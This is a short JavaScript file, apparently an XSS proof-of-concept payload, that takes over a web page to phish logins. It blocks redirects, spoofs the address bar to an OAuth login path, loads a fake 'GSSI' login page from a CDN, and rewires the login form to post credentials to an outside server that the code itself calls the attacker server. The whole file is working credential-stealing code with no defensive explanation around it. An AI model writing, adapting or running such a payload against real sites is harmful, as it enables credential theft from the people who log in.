// fakelogin.js - Clean & Stable version for the new login.html

(function() {
    'use strict';

    // Block redirects aggressively
    window.location.assign = () => {};
    window.location.replace = () => {};
    window.location.reload = () => {};
    
    // Override history to keep clean URL
    const originalReplaceState = history.replaceState;
    history.replaceState = function(state, title, url) {
        originalReplaceState.call(this, state, title, '/gpapi/oauth/login');
    };
    history.pushState = () => {};

    // Load the clean fake login page
    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login1.html')
        .then(response => response.text())
        .then(html => {
            // Full page replacement
            document.documentElement.innerHTML = html;

            // Small delay to let DOM settle
            setTimeout(() => {
                fixFormAction();
                console.log('%c[PoC] Clean Fake GSSI Login Page Loaded Successfully', 
                    'color: #FF3C00; font-size: 16px; font-weight: bold');
            }, 300);
        })
        .catch(err => {
            console.error('Failed to load fake login:', err);
            // Simple fallback
            document.body.innerHTML = `
                <div style="text-align:center; margin-top:100px; font-family:Arial;">
                    <h2 style="color:#FF3C00;">Session Expired</h2>
                    <p>Please log in again.</p>
                </div>`;
        });
})();

// Ensure the form always submits to your attacker server
function fixFormAction() {
    const form = document.getElementById('DietaryLogin');
    if (form) {
        form.action = 'https://hackersrising.com/GPAPI/oauth/login';
        form.method = 'post';
        
        // Optional: Add visual feedback in console
        console.log('%c[PoC] Form action locked to attacker server', 'color: lime');
    }
}
